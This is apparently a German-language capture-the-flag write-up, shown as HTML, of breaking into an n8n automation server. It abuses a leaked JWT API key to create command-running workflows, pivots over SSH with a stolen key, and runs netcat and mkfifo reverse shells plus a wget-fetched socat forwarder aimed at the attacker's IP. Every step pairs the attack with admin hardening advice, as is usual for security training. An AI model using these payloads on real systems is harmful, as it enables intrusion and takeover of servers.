+HEADER:ALGORITHM & TOKEN TYPE
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+PAYLOAD:DATA
+{
+  "sub": "e91a5e69-2c0b-4a19-9470-cde38cab198c",
+  "iss": "n8n",
+  "aud": "public-api",
+  "iat": 1738969205 <span class="comment">--(Timestamp ca. Feb 2025)</span>
+}
+
+VERIFY SIGNATURE
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+  <span class="password">[Secret benötigt, um Signatur zu prüfen]</span>
+) secret base64 encoded</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das gefundene JWT wird dekodiert. Der Header gibt den Algorithmus (HS256) an. Der Payload enthält Standard-Claims wie Subject (`sub`), Issuer (`iss`), Audience (`aud`) und Issued At (`iat`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Payload selbst enthält keine direkten Zugangsdaten. Da es sich um HS256 handelt (symmetrische Signatur), könnte man versuchen, das Secret zu knacken, um eigene Tokens zu erstellen, aber das ist oft schwierig. Die wichtigste Erkenntnis ist, dass dieses Token wahrscheinlich als API-Schlüssel für die n8n-Instanz dient.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den vollständigen JWT-String als `X-N8N-API-KEY` Header in Anfragen an die n8n API-Endpunkte (vermutlich unter `/api/v1/...` auf Port 5678).<br><strong>Empfehlung (Admin):** Verwenden Sie nach Möglichkeit asymmetrische Algorithmen (wie RS256) für JWTs, wenn das Secret nicht sicher auf dem Client gespeichert werden kann. Rotieren Sie Secrets regelmäßig.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">dirsearch -u http://192.168.2.171:5678 -e php,html,js,txt,json -t 50</span></div>
+                     <pre>
+[...]
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, html, js, txt, json | HTTP method: GET | Threads: 50 | Wordlist size: 11454
+
+Output File: /root/reports/http_192.168.2.171_5678/_25-02-08_00-06-04.txt
+
+Target: http://192.168.2.171:5678/
+
+[00:06:04] Starting: 
+[00:06:13] 301 -  156B  - /assets  ->  /assets/
+[00:06:19] 200 -   15KB - /favicon.ico
+[00:06:21] 200 -   15B  - <span class="command">/healthz</span>
+[00:06:33] 301 -  156B  - /static  ->  /static/
+[00:06:35] 301 -  155B  - /types  ->  /types/
+
+Task Completed</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `dirsearch` wird verwendet, um Verzeichnisse und Dateien auf der n8n-Instanz (Port 5678) zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Ergebnisse von Gobuster (`/assets`, `/static`, `/types`) und findet zusätzlich den Endpunkt `/healthz` und `/favicon.ico`. Der `/healthz`-Endpunkt könnte Statusinformationen liefern.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den `/healthz`-Endpunkt. Konzentrieren Sie sich weiterhin auf die API-Interaktion mit dem gefundenen JWT.<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass Health-Check-Endpunkte keine sensiblen Informationen preisgeben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ffuf -u http://192.168.2.171:5678/rest/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,403</span></div>
+                     <pre>
+[...]
+<span class="command">settings</span>                [Status: 200, Size: 3011, Words: 1, Lines: 1, Duration: 14ms]
+<span class="command">SETTINGS</span>                [Status: 200, Size: 3011, Words: 1, Lines: 1, Duration: 9ms]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `ffuf` wird verwendet, um gezielt nach Endpunkten unter dem Pfad `/rest/` auf Port 5678 zu suchen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Endpunkt `/rest/settings` wird gefunden und liefert einen Status 200 OK. Dieser Endpunkt könnte Konfigurationsdetails oder andere sensible Informationen enthalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `http://192.168.2.171:5678/rest/settings` mit `curl` auf (ggf. mit dem API-Schlüssel), um den Inhalt zu untersuchen.<br><strong>Empfehlung (Admin):** Sichern Sie alle API-Endpunkte, insbesondere solche, die Einstellungen preisgeben könnten, mit robuster Authentifizierung und Autorisierung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST http://192.168.2.171:5678/rest/login -d '{"user": {"$ne": null}, "pass": {"$ne": null}}'</span></div>
+                     <pre>{"code":"invalid_type","expected":"string","received":"undefined","path":["email"],"message":"Required"}</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Versuch, sich über den Endpunkt `/rest/login` anzumelden, möglicherweise mit einer NoSQL-Injection-Syntax (`$ne`: not equal).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Anfrage schlägt fehl, da die API einen String im Feld `email` erwartet. Dies deutet auf eine strukturierte API hin, schließt aber eine Schwachstelle nicht vollständig aus. Die NoSQLi-Syntax scheint hier nicht zu funktionieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, gültige Anfragen an `/rest/login` zu senden oder suchen Sie nach anderen Authentifizierungsmethoden (wie der API-Schlüssel).<br><strong>Empfehlung (Admin):** Strikte Eingabevalidierung auf allen API-Endpunkten ist entscheidend.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">sqlmap -u "http://192.168.2.171:5678/rest/login" --data "user=admin&pass=admin" --dbs</span></div>
+                     <pre>
+[...]
+[!] legal disclaimer: [...]
+[...]
+[00:10:04] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+[...]
+[00:10:05] [WARNING] PST parameter 'user' does not appear to be dynamic
+[00:10:05] [WARNING] heuristic (basic) test shows that PST parameter 'user' might not be injectable
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `sqlmap` wird verwendet, um auf SQL-Injection-Schwachstellen am `/rest/login`-Endpunkt zu testen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `sqlmap` meldet, dass der Parameter `user` nicht dynamisch zu sein scheint und wahrscheinlich nicht anfällig für SQL-Injection ist. Der HTTP 400 Fehler erschwert den Test zusätzlich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SQL-Injection ist auf diesem Endpunkt unwahrscheinlich. Konzentrieren Sie sich auf die n8n-spezifischen Funktionen und die API.<br><strong>Empfehlung (Admin):** Obwohl hier keine SQLi gefunden wurde, ist die Verwendung von Prepared Statements und ORMs zur Verhinderung von SQLi unerlässlich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.171:5678/rest/sentry.js</span></div>
+                     <pre>window.sentry={"dsn":"","environment":"development",<span class="command">"release":"1.76.3"</span>}</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt einer Sentry-JavaScript-Datei wird abgerufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthüllt die n8n-Version: `<span class="command">1.76.3</span>`. Dies ist eine wichtige Information für die Suche nach bekannten Schwachstellen (CVEs) für diese spezifische n8n-Version.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach bekannten Exploits oder Schwachstellen für n8n Version 1.76.3.<br><strong>Empfehlung (Admin):** Halten Sie n8n und alle Abhängigkeiten auf dem neuesten Stand. Beschränken Sie den Zugriff auf solche Informationsdateien.</p>
+
+            <!-- API Interaktion mit JWT -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST "http://192.168.2.171:5678/api/v1/workflows/7ciRIY8rtVvM1E/activate" \
+     -H "X-N8N-API-KEY: eyJhbGciiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiiJlTFhNWU2S0yYzBiLTRhMTktTQ3MC1jZGUzGNhYjE5GMiLCJpc3MiiJuG4iLCJhdWQiiJwdWJsaWMtYXBpIiwiaWF0IjoxNzM4TY5MjA1fQ.v7k5uyavedgnZQQKK5gAFbuA1W4Pw29-9Rm61U6FchM"</span></div>
+                     <pre>{"message":"Workflow \"Exploit\" (ID: 7ciRIY8rtVvM1E) has no node to start the workflow - at least one trigger, poller or webhook node is required"}</pre>
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST "http://192.168.2.171:5678/api/v1/workflows/7ciRIY8rtVvM1E/run" \
+     -H "X-N8N-API-KEY: eyJhbGciiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiiJlTFhNWU2S0yYzBiLTRhMTktTQ3MC1jZGUzGNhYjE5GMiLCJpc3MiiJuG4iLCJhdWQiiJwdWJsaWMtYXBpIiwiaWF0IjoxNzM4TY5MjA1fQ.v7k5uyavedgnZQQKK5gAFbuA1W4Pw29-9Rm61U6FchM"</span></div>
+                    <pre>{"message":"not found"}</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit dem gefundenen JWT als API-Schlüssel einen n8n-Workflow mit der ID `7ciRIY8rtVvM1E` über die API zu aktivieren (`/activate`) und auszuführen (`/run`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Beide Versuche schlagen fehl. Die Aktivierung scheitert, weil der Workflow keinen Startknoten (Trigger) hat. Die Ausführung scheitert mit "not found", was darauf hindeutet, dass dieser Endpunkt nicht existiert oder der Workflow nicht ausführbar ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der API-Schlüssel scheint gültig zu sein, aber die Workflow-Interaktion erfordert weitere Schritte. Versuchen Sie, Workflows aufzulisten (`GET /api/v1/workflows`) oder zu modifizieren/erstellen (wahrscheinlich mit PUT oder POST auf `/api/v1/workflows` oder `/api/v1/workflows/{id}`).<br><strong>Empfehlung (Admin):** Beschränken Sie die Berechtigungen des API-Schlüssels, um unerwünschte Workflow-Manipulationen zu verhindern.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X GET "http://192.168.2.171:5678/api/v1/workflows" \
+     -H "X-N8N-API-KEY: eyJhbGciiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiiJlTFhNWU2S0yYzBiLTRhMTktTQ3MC1jZGUzGNhYjE5GMiLCJpc3MiiJuG4iLCJhdWQiiJwdWJsaWMtYXBpIiwiaWF0IjoxNzM4TY5MjA1fQ.v7k5uyavedgnZQQKK5gAFbuA1W4Pw29-9Rm61U6FchM"</span></div>
+                     <pre><span class="password">{"data":[{"createdAt":"2025-02-07T23:16:05.512Z","updatedAt":"2025-02-07T23:16:05.512Z","id":"7ciRIY8rtVvM1E","name":"Exploit","active":false,"nodes":[{"parameters":{"command":"id"},"name":"Command","type":"n8n-nodes-base.executeCommand","typeVersion":1,"position":[450,250],"id":"f29d23ec-622b-4e6e-a56a-a48293ea3669"}],"connections":{},"settings":{},"staticData":null,"meta":null,"pinData":null,"versionId":"b00a5263-1a21-4ebe-84d3-9a0763ff87fe","triggerCount":0,"tags":[]}],"nextCursor":null}</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein GET-Request wird an den Endpunkt `/api/v1/workflows` gesendet, um die existierenden Workflows aufzulisten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die API liefert eine Liste mit einem Workflow namens "Exploit" und der ID `7ciRIY8rtVvM1E`. Die Struktur des Workflows wird angezeigt: Er enthält aktuell nur einen "Execute Command"-Knoten, der den Befehl `id` ausführt, aber keinen Start-Trigger.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Jetzt ist die Struktur bekannt. Versuchen Sie, diesen Workflow mit PUT oder POST auf `/api/v1/workflows/7ciRIY8rtVvM1E` zu modifizieren, um einen Trigger (z.B. Cron oder Manual Trigger) und einen Command-Knoten mit einer Reverse-Shell-Payload hinzuzufügen.<br><strong>Empfehlung (Admin):** API-Berechtigungen überprüfen und einschränken.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST "http://192.168.2.171:5678/api/v1/workflows" \
+     -H "X-N8N-API-KEY: eyJhbGciiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiiJlTFhNWU2S0yYzBiLTRhMTktTQ3MC1jZGUzGNhYjE5GMiLCJpc3MiiJuG4iLCJhdWQiiJwdWJsaWMtYXBpIiwiaWF0IjoxNzM4TY5MjA1fQ.v7k5uyavedgnZQQKK5gAFbuA1W4Pw29-9Rm61U6FchM" \
+     -H "Content-Type: application/json" \
+     -d '{
+           "name": "Exploit",
+           "settings": {},
+           "nodes": [
+               {
+                   "parameters": {
+                       "command": "id" <span class="comment"># Payload hier ändern!</span>
+                   },
+                   "name": "Command",
+                   "type": "n8n-nodes-base.executeCommand",
+                   "typeVersion": 1,
+                   "position": [450, 250]
+               }
+               <span class="comment"># Trigger-Knoten fehlt hier noch</span>
+           ],
+           "connections": {}
+         }'</span></div>
+                      <pre>{"name":"Exploit","settings":{},"nodes":[{"parameters":{"command":"id"},"name":"Command","type":"n8n-nodes-base.executeCommand","typeVersion":1,"position":[450,250],"id":"77fdbb47-7eb9-4327-aacc-177473474751"}],"connections":{},"active":false,"versionId":"d083fbfa-ba6c-47fd-9dfd-7af32d0fcb89","id":"TKwsTuz8GFEdS9Rk","staticData":null,"meta":null,"pinData":null,"createdAt":"2025-02-07T23:37:10.300Z","updatedAt":"2025-02-07T23:37:10.300Z","triggerCount":0}</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Es wird versucht, einen neuen Workflow namens "Exploit" per POST-Request zu erstellen. Dieser Workflow enthält nur einen Command-Knoten mit dem Befehl `id` und keine Trigger.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der Request ist erfolgreich und erstellt einen neuen Workflow (mit der ID `TKwsTuz8GFEdS9Rk`). Dies bestätigt, dass der API-Schlüssel die Berechtigung zum Erstellen von Workflows hat. Allerdings ist dieser Workflow so nicht direkt ausführbar.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Passen Sie den JSON-Payload an, um einen Trigger (z.B. `n8n-nodes-base.manualTrigger` oder `n8n-nodes-base.cron`) und eine Verbindung (`connections`) zum Command-Knoten hinzuzufügen. Ersetzen Sie außerdem `"command": "id"` durch die gewünschte Reverse-Shell-Payload.<br><strong>Empfehlung (Admin):** Entziehen Sie dem API-Schlüssel die Berechtigung zum Erstellen/Modifizieren von Workflows.</p>
+
+            <!-- SSH Key Extraction & Usage via n8n UI -->
+             <p class="analysis"><strong>Analyse (n8n UI - SSH Credential Setup):</strong> Der Bericht beschreibt nun Schritte, die innerhalb der n8n-Weboberfläche (erreichbar über Port 5678) durchgeführt wurden. Es wurde die SSH-Credential-Funktion von n8n genutzt.
+                 1.  Der zuvor aus `index.html` extrahierte private SSH-Schlüssel (`key.txt`) wurde in das entsprechende Feld in n8n eingefügt.
+                 2.  Als Benutzer wurde `shawa` angegeben (basierend auf dem Kommentar im Schlüssel und dem `ssh-keygen -y`-Output).
+                 3.  Als Ziel-Host wurde `172.17.0.1` identifiziert. Diese Information stammt laut Bericht aus einer Meldung beim Start der VM und ist wahrscheinlich die IP-Adresse des Hosts *innerhalb* einer Docker- oder Container-Umgebung, in der n8n läuft. Port 22 ist der Standard-SSH-Port.
+                 4.  Der Verbindungstest innerhalb von n8n war erfolgreich ("Connection tested successfully").</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein entscheidender Schritt. Obwohl der direkte SSH-Zugriff von außen (192.168.2.171:22) fehlschlug, kann die n8n-Anwendung selbst eine SSH-Verbindung zur internen IP `172.17.0.1` als Benutzer `shawa` mit dem gefundenen Schlüssel herstellen. N8n agiert hier als Pivot.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen oder modifizieren Sie einen n8n-Workflow, der einen "Execute Command"-Knoten verwendet. Konfigurieren Sie diesen Knoten so, dass er die gerade erstellten SSH-Credentials nutzt, um Befehle auf `172.17.0.1` als `shawa` auszuführen. Verwenden Sie eine Reverse-Shell-Payload als auszuführenden Befehl.<br><strong>Empfehlung (Admin):** Beschränken Sie die Netzwerkzugriffe der n8n-Instanz (insbesondere ausgehende SSH-Verbindungen). Sichern Sie SSH-Credentials innerhalb von n8n und beschränken Sie, wer sie verwenden darf.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Beschreibung der n8n UI Konfiguration -->
+                     <pre>n8n UI: http://192.168.2.171:5678/
+Bereich: Credentials -> SSH Private Key
+
+Host: <span class="command">172.17.0.1</span>
+Port: <span class="command">22</span>
+Username: <span class="command">shawa</span>
+Private Key: <span class="password">[Inhalt von key.txt hier eingefügt]</span>
+
+Ergebnis: Connection tested successfully</pre>
+                 </div>
+             </div>
+
+            <!-- Reverse Shell Execution via n8n Workflow -->
+             <p class="analysis"><strong>Analyse (n8n Workflow Execution):** Es wird ein n8n-Workflow erstellt/modifiziert, der über die zuvor konfigurierten SSH-Credentials einen Befehl auf `172.17.0.1` ausführt. Verschiedene Reverse-Shell-Payloads werden getestet:</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Getestete Payloads im n8n "Execute Command" Node -->
+                     <pre>1. Versuch: <span class="command">nc -e /bin/bash 192.168.2.199 4444</span>  (Fehlgeschlagen, s. Output unten)
+2. Versuch: <span class="command">BusyBox nc -e /bin/bash 192.168.2.199 4444</span> (Fehlgeschlagen, s. Output unten)
+3. Versuch: <span class="command">mkfifo /tmp/f; nc 192.168.2.199 4444 < /tmp/f | sh > /tmp/f 2>&1; rm /tmp/f</span> (Erfolgreich!)</pre>
+                     <!-- Beispielhafter n8n Output für Fehlversuche -->
+                     <pre>
+Output für Versuch 1 (nc -e):
+stderr: sh: cd: line 0: can't cd to /start: No such file or directory\nBusyBox v1.37.0 ... Usage: nc [OPTIONS]...
+
+Output für Versuch 2 (BusyBox nc -e):
+stderr: sh: cd: line 0: can't cd to /start: No such file or directory\nsh: BusyBox: not found
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die ersten beiden Versuche mit `nc -e` scheitern, wahrscheinlich weil die `nc`-Version auf dem Zielsystem (Alpine Linux mit BusyBox) die Option `-e` nicht unterstützt oder `/bin/bash` nicht der korrekte Shell-Pfad ist (`/bin/sh` ist Standard bei Alpine). Der dritte Versuch mit der `mkfifo`-Technik funktioniert jedoch.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die `mkfifo`-Payload ist oft robuster auf Systemen mit eingeschränkten Shells oder Tools wie BusyBox. Starten Sie den Netcat-Listener auf dem Angreifer-System (`192.168.2.199:4444`) und führen Sie den n8n-Workflow mit der `mkfifo`-Payload aus.<br><strong>Empfehlung (Admin):** Härten Sie die Container-/Systemumgebung, indem Sie unnötige Tools entfernen. Überwachen und beschränken Sie die Befehle, die über Automatisierungstools wie n8n ausgeführt werden können.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.171] 40447</span></pre>
+                     <!-- Shell Prompt fehlt hier -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf dem Angreifer-System (`192.168.2.199:4444`) empfängt die eingehende Verbindung von der Ziel-IP (192.168.2.171), die durch die Ausführung der `mkfifo`-Payload im n8n-Workflow initiiert wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Initialer Zugriff erfolgreich! Eine Shell wurde als Benutzer `shawa` auf dem Zielsystem (wahrscheinlich innerhalb des Containers bei `172.17.0.1`) erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell ist wahrscheinlich sehr einfach (`sh`). Versuchen Sie, sie zu stabilisieren und führen Sie grundlegende Enumerationsbefehle aus (`id`, `whoami`, `ls`, `cat user.txt`).<br><strong>Empfehlung (Admin):** Untersuchen Sie die n8n-Logs, um die Kompromittierung nachzuvollziehen. Beheben Sie die API-Key-Schwachstelle und die unsichere SSH-Konfiguration in n8n.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Innerhalb der ersten Reverse Shell -->
+                     <pre>which python3
+which python
+which python2
+<span class="command">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 4445 >/tmp/f</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Innerhalb der ersten (`mkfifo`) Reverse Shell wird nach Python-Interpretern gesucht (erfolglos). Anschließend wird ein Befehl ausgeführt, um eine potenziell stabilere interaktive Shell (`/bin/sh -i`) zu starten und diese über `nc` zu einem neuen Listener auf Port 4445 umzuleiten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein gängiger Versuch, eine einfachere `nc`-Shell in eine interaktivere `sh`-Shell umzuwandeln, die z.B. Job Control besser handhaben könnte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen zweiten Listener auf Port 4445 (`nc -lvnp 4445`), um diese verbesserte Shell zu empfangen.<br><strong>Empfehlung (Admin):** Minimal gehaltene Systeminstallationen (wie oft bei Alpine) erschweren Angreifern das Finden von Tools zur Shell-Stabilisierung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4445</span></div>
+                     <pre>listening on [any] 4445 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.171] 38473</span>
+/bin/sh: can't access tty; job control turned off
+~ $ <span class="command">id</span>
+<span class="command">uid=1000(shawa) gid=1000(shawa) groups=1000(shawa)</span>
+~ $</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der zweite Listener auf Port 4445 empfängt die Verbindung. Der `id`-Befehl bestätigt, dass die Shell weiterhin als Benutzer `shawa` (UID 1000) läuft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzerkontext ist bestätigt. Die Shell ist nun möglicherweise etwas stabiler für die weitere Enumeration.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nun Enumeration als `shawa` durch: Flag suchen, Netzwerk prüfen, sudo checken, OS-Informationen sammeln.<br><strong>Empfehlung (Admin):** Überwachung auf verdächtige ausgehende Verbindungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">~ $ <span class="command">ls</span></div>
+                     <pre>user.txt</pre>
+                     <div class="prompt">~ $ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">HMVHIMNTREAL</span></pre>
+                     <div class="prompt">~ $</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `shawa` wird die Datei `user.txt` gefunden und ihr Inhalt ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flagge `<span class="password">HMVHIMNTREAL</span>` wurde erfolgreich gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flagge notieren. Mit der Suche nach Wegen zur Privilege Escalation fortfahren.<br><strong>Empfehlung (Admin):** Sensible Daten/Flaggen sollten nicht einfach im Home-Verzeichnis liegen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">~ $ <span class="command">netstat -altnp</span></div>
+                     <pre>netstat: showing only processes with your user ID
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 <span class="command">172.17.0.1:22</span>           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:5678            0.0.0.0:*               LISTEN      -
+tcp        0      0 172.17.0.1:22           172.17.0.2:45834        ESTABLISHED -
+tcp        0      0 192.168.2.171:40447     192.168.2.199:4444      CLOSE_WAIT  2901/nc
+tcp        0     54 192.168.2.171:38473     192.168.2.199:4445      ESTABLISHED 2935/nc
+tcp        0      0 192.168.2.171:35155     192.168.2.199:4444      ESTABLISHED 2927/nc
+tcp        0      0 172.17.0.1:22           172.17.0.2:60102        ESTABLISHED -
+tcp        0      0 :::80                   :::*                    LISTEN      -
+tcp        0      0 :::5678                 :::*                    LISTEN      -</pre>
+                     <div class="prompt">~ $ <span class="command">sudo -l</span></div>
+                     <pre>/bin/sh: sudo: not found</pre>
+                     <div class="prompt">~ $</div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `netstat -altnp` wird ausgeführt, um Netzwerkverbindungen anzuzeigen (zeigt hier nur die des Benutzers `shawa`). `sudo -l` wird versucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `netstat` bestätigt die Listener auf Port 80, 5678 und den internen SSH-Port 22 auf `172.17.0.1`. Es zeigt auch die etablierten Reverse-Shell-Verbindungen zu Port 4444 und 4445 des Angreifers. Der Versuch, `sudo -l` auszuführen, schlägt fehl, da `sudo` auf diesem Alpine-System nicht installiert ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `sudo` nicht verfügbar ist, suchen Sie nach anderen PE-Vektoren: SUID/GUID-Binaries, Fehlkonfigurationen, Kernel-Exploits, Cronjobs.<br><strong>Empfehlung (Admin):** Minimalinstallationen (wie bei Alpine üblich) reduzieren die Angriffsfläche, da Tools wie `sudo` fehlen können. Sicherstellen, dass keine unnötigen Netzwerkdienste laufen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">~ $ <span class="command">cat /etc/os-release</span></div>
+                     <pre>NAME="Alpine Linux"
+ID=alpine
+VERSION_ID=3.21.2
+PRETTY_NAME="Alpine Linux v3.21"
+HOME_URL="https://alpinelinux.org/"
+BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"</pre>
+                     <div class="prompt">~ $ <span class="command">hostnamectl</span></div>
+                     <pre>/bin/sh: hostnamectl: not found</pre>
+                     <div class="prompt">~ $</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die OS-Version wird mit `cat /etc/os-release` ermittelt. `hostnamectl` ist nicht vorhanden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das System ist Alpine Linux v3.21. Diese Information ist nützlich für die Suche nach spezifischen Schwachstellen oder Konfigurationseigenheiten von Alpine.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Berücksichtigen Sie bei der weiteren Enumeration und Exploit-Suche, dass es sich um Alpine Linux handelt (z.B. andere Shell, andere Paketmanager, musl libc statt glibc).<br><strong>Empfehlung (Admin):** Halten Sie das Betriebssystem und die Pakete auf dem neuesten Stand.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Port Forwarding Setup via Reverse Shell -->
+                      <div class="prompt">~ $ <span class="command">cd /tmp</span></div>
+                      <div class="prompt">/tmp $ <span class="command">wget 192.168.2.199/socat</span></div>
+                      <pre>Connecting to 192.168.2.199 (192.168.2.199:80)
+saving to 'socat'
+socat                100% |****************************************************************************************************|  366k  0:00:00 ETA
+'socat' saved</pre>
+                      <div class="prompt">/tmp $ <span class="command">chmod +x socat</span></div>
+                      <div class="prompt">/tmp $ <span class="command">ls -la socat</span></div>
+                      <pre>-rwxr-xr-x    1 shawa    shawa       375176 Feb  9 00:14 socat</pre>
+                      <div class="prompt">/tmp $ <span class="command">./socat</span></div>
+                      <pre>2025/02/09 00:15:09 socat[2983] E exactly 2 addresses required (there are 0); use option "-h" for help</pre>
+                      <div class="prompt">/tmp $ <span class="command">./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &</span></div>
+                      <pre>[1] 2984</pre> <!-- Beispielhafte Job-ID -->
+                      <div class="prompt">/tmp $</div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Um den direkten SSH-Zugriff von außen zu ermöglichen, wird das Tool `socat` vom Angreifer-Server auf das Zielsystem (in `/tmp`) heruntergeladen, ausführbar gemacht und gestartet. `socat` wird so konfiguriert, dass es auf Port 2222 des Zielsystems lauscht (`TCP-LISTEN:2222`) und eingehende Verbindungen an die interne SSH-Adresse `172.17.0.1:22` weiterleitet (`TCP4:172.17.0.1:22`). `fork` sorgt dafür, dass für jede eingehende Verbindung ein neuer Prozess gestartet wird, und `&` startet `socat` im Hintergrund.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine effektive Methode, um die Firewall oder die Beschränkung der `ListenAddress` des SSH-Dienstes zu umgehen. Der Angreifer kann sich nun direkt per SSH verbinden, indem er Port 2222 auf der Haupt-IP (192.168.2.171) anspricht.</p>
